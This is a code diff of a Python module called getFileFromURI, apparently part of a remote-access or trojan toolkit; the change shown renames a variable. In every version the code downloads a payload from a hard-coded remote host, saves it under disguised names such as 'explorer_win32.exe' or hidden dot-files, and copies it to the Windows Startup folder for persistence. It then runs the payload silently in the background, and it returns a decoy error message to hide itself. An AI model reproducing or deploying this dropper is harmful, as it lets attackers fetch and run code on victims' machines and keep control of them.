@@ -27,7 +27,7 @@ except:
 bin = False
 ScriptExec = "python3.5 " # "./"  #cmd= "./{}".format(OsTargetpath)
 url = "http://192.168.2.112:8000/TCP_client.py"
-OsTargetpath = ".payload_posix"
+targetFile = ".payload_posix"
 shellcode = ""
 start = True #To decide entweder an oder aus die Zugriff
 winRunOnBoot=True
@@ -36,18 +36,18 @@ linRunOnBoot=False
 def run(**args):
     #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
     print('[*] In getFileFromURI module.')
-    global bin, url, ScriptExec, OsTargetpath, shellcode
+    global bin, url, ScriptExec, targetFile, shellcode
     if os.name == 'nt':
         bin = True
         ScriptExec = "python"
         url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
-        OsTargetpath = os.getenv("PUBLIC")+ "\explorer_win32.exe"
+        targetFile = os.getenv("PUBLIC")+ "\explorer_win32.exe"
 
     elif os.name == 'posix':
         bin = True
         ScriptExec = "python3.6 "
         url = "http://192.168.2.112:8000/lk_debian"   #"http://saw-dsr.ddns.net:8000/TCP_client.py"
-        OsTargetpath = ".lk_debian"
+        targetFile = ".lk_debian"
         #TODO if linRunOnBoot:
     else:
         return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
@@ -69,31 +69,31 @@ def run(**args):
         return "getFileFromURI: HTTP Error 404: File not found"
 
     try:
-        mon_fichier = open(OsTargetpath, "wb")
+        mon_fichier = open(targetFile, "wb")
 
         mon_fichier.write(shellcode)
         mon_fichier.close()
         print(r.status, "************File succ closely ***********")
         if os.name == 'nt' and winRunOnBoot == True:
             startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-            os.system('copy /Y "%s" "%s" '%(targetPath, startPath))
+            os.system('copy /Y "%s" "%s" '%(targetFile, startPath))
     except:
-        print("[Error] getFileFromURI: could not create OsTargetpath")
+        print("[Error] getFileFromURI: could not create %s"%targetFile)
         return " modules/_bootlocale not found!!"
 
     if start and os.name == 'nt': #TODO: check how to start python script
         if bin:
-            os.system("start {}".format(OsTargetpath))
+            os.system("start {}".format(targetFile))
         else:
-            os.system(scriptExec+" "+OsTargetpath)
+            os.system(scriptExec+" "+targetFile)
     elif start and os.name == 'posix':
-          os.system("chmod 755 {}".format(OsTargetpath))
-          os.system("./"+OsTargetpath +" >/dev/null &")
+          os.system("chmod 755 {}".format(targetFile))
+          os.system("./"+targetFile +" >/dev/null &")
     else:
-          return ("Script is Stored under {} but never started".format(OsTargetpath))
+          return ("Script is Stored under {} but never started".format(targetFile))
 
     time.sleep(1)
-    return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
+    return str("getFileFromURI: file {} successfully started".format(targetFile))
 
 
 run()
